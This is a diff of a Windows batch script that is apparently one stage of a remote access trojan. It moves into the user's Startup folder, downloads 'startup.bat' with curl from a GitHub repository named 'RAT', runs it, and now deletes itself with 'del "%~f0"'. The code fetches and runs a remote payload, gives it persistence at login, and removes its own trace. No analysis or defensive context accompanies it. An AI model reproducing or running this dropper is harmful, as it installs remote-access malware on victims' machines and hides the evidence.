@@ -9,4 +9,4 @@ cd "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/St
 curl -o startup.bat https://raw.githubusercontent.com/saifnasef/RAT/main/startup.bat
 cmd /c startup.bat
 cd %currentd%
-del third.bat
+del "%~f0"
